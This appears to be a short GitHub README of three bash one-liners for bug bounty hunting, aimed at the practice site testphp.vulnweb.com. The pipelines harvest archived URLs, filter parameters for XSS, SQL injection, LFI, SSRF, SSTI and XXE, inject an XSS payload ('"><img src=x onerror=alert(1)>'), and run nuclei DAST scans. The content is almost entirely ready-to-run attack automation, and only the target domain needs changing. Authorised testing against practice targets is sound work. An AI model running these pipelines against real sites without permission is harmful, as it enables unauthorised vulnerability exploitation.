# SIMPLE ONE LINER
One Liner for Bug Bounty Hunting by `RootBakar`

### Command 1:
```bash
echo "testphp.vulnweb.com" | waybackurls | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
```
### Result:
<img width="1440" alt="image" src="https://github.com/user-attachments/assets/1c80107a-708f-461e-8af7-44f323d6082d">

### Command 2:
```bash
echo "testphp.vulnweb.com" | gau --fc 200 | urldedupe -s -qs | gf lfi redirect sqli-error sqli ssrf ssti xss xxe | qsreplace FUZZ | grep FUZZ | nuclei -silent -t ~/nuclei-templates/dast/vulnerabilities -dast
```
### Result:
<img width="1440" alt="image" src="https://github.com/user-attachments/assets/3ec661fb-63f3-4d75-a3e3-c163ac96c506">

### Command 3:
```bash
echo "testphp.vulnweb.com" | gau --fc 200 | urldedupe -s -qs -ne | gf xss | qsreplace '"><img src=x onerror=alert(1)>' | freq | egrep -v 'Not'
```
### Result:
<img width="1440" alt="image" src="https://github.com/user-attachments/assets/40e8eb4a-8360-4c3f-9421-ceece6e0a5ba">


